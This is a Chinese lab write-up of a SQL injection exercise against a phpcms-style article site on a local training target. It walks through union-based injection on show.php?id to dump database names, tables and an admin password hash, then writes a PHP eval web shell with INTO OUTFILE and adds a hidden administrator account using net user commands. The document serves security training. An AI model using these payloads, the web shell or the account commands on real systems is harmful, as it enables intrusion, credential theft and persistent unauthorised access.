---
description: 记录学习平台上实验过程和注入的思路
---

# Web渗透之基于phpcms的sql注入实验

## 记录实验过程

先启动靶机的服务，然后打开攻击机，使用浏览器访问PHP网站http://192.168.1.26:8083,打开了一个文章管理系统。

![&#x6587;&#x7AE0;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x4E3B;&#x9875;](../.gitbook/assets/image%20%2818%29.png)

当我们访问一个文章时，会出现这样的链接

![&#x5355;&#x4E2A;&#x65B0;&#x95FB;&#x7684;&#x94FE;&#x63A5;](../.gitbook/assets/image%20%2825%29.png)

  
所以测试一下该网站此处是否存在sql注入漏洞

当我们构造这个http://192.168.1.26:8083/show.php?id=33 and 1=2链接访问时，系统返回了空白的页面

![&#x8FD4;&#x56DE;&#x7A7A;&#x767D;&#x9875;&#x9762;](../.gitbook/assets/image%20%289%29.png)

  
当我们访问http://192.168.1.26:8083/show.php?id=33 and 1=1时，返回了正常的页面

![&#x8FD4;&#x56DE;&#x6B63;&#x5E38;&#x7684;&#x9875;&#x9762;](../.gitbook/assets/image%20%2822%29.png)

  
当我们尝试去http://192.168.1.26:8083/show.php?id=33‘访问时，出现了报错信息

![&#x7A0B;&#x5E8F;&#x62A5;&#x9519;&#x4FE1;&#x606F;](../.gitbook/assets/image%20%2837%29.png)

通过以上3次测试，我们可以得出基本的两个结论：  
1.存在sql注入漏洞  
2.程序采用的数据库为MYSQL

下面就考虑如何让数据库回显信息，既然有报错信息那么报错注入可以使用，我们还可以测试一下返回的字段数，直接回显信息。这里采用group by num 来测试（翻倍递增可以加快测试速度），最终测试出来长度为15

![&#x957F;&#x5EA6;&#x4E3A;16&#x65F6;&#x62A5;&#x9519;](../.gitbook/assets/image%20%284%29.png)

![&#x957F;&#x5EA6;&#x4E3A;15&#x65F6;&#x6B63;&#x5E38;&#x663E;&#x793A;](../.gitbook/assets/image%20%2835%29.png)

测试一下显示的是第几个字段，http://192.168.1.26:8083/show.php?id=33 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15。发现第3个和第11个有回显

![&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;](../.gitbook/assets/image%20%2830%29.png)

**实验手册中的几个payload\(基本思路都是利用sql函数和mysql系统数据库information\_schema\)**  
1.查看 mysql 版本 version\(\)  
2.查看当前数据库 database\(\)  
3.查看当前用户 user\(\)  
4.利用 and 1=2 union select 1,2,group\_concat\(convert\(SCHEMA\_NAME using latin1\)\),4,5,6,7,8,9,10,11,12,13,14,15  from  information\_schema.SCHEMATA，查看 mysql中所有数据库的名称。  
5.利用 and 1=2 union select 1,2,group\_concat\(convert\(table\_name using latin1\)\),4,5,6,7,8,9,10,11,12,13,14,15 from information\_schema.tables where table\_schema=database\(\) ，查看 cms 数据库拥有的所有表。可以发现存放用户信息的表cms\_users。  
6.利用 and 1=2 union select 1,2,group_concat\(convert\(column\_name using latin1\)\),4,5,6,7,8,9,10,11,12,13,14,15 from information\_schema.columns where table\_name=0x636D735F7573657273。 table\_name=cms\_users，表名需要编码为 16 进制。得到 3 个列：userid，username 和 password 从ASCII对照表中可知对应：c\(63\) m\(6d\) s\(73\)_ \(5f\) u\(75\) s\(73\) e\(65\) r\(72\) s\(73\)  
7.利用 and 1=2 union select 1,2,concat\_ws\(0x2b,userid,username,password\),4,5,6,7,8,9,10,11,12,13,14,15 from cms.cms\_users。得到管理员账号密码为：admin/e10adc3949ba59abbe56e057f20f883e（解密后123456）  


![&#x83B7;&#x5F97;&#x540E;&#x53F0;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;](../.gitbook/assets/image%20%2815%29.png)

登录后台：

![](../.gitbook/assets/image%20%2813%29.png)

后台页面竟然有报错信息......，暴露了目录，直接写一个木马。http://192.168.1.26:8083/show.php?id=33 union select '&lt;?php eval\($\_POST\[cmd\]\); ?&gt;',1,1,1,1,1,1,1,1,1,1,1,1,1,1 into outfile D:\\WWW\\cms\\ma.php

![](../.gitbook/assets/image%20%2838%29.png)

菜刀链接 

![](../.gitbook/assets/image%20%2828%29.png)

打开虚拟终端尝试添加用户：

net user test test /add  


![&#x6DFB;&#x52A0;&#x7528;&#x6237;](../.gitbook/assets/image%20%285%29.png)

  
添加用户到管理员组

net localgroup Administrators test /add  


![&#x6DFB;&#x52A0;&#x7528;&#x6237;&#x5230;&#x7BA1;&#x7406;&#x5458;&#x7EC4;](../.gitbook/assets/image%20%2810%29.png)

  
查看管理员组   
net localgroup administrators

![&#x67E5;&#x770B;&#x7BA1;&#x7406;&#x5458;&#x7EC4;](../.gitbook/assets/image%20%2832%29.png)

尝试远程桌面链接

![&#x8FDC;&#x7A0B;&#x684C;&#x9762;](../.gitbook/assets/image%20%2814%29.png)



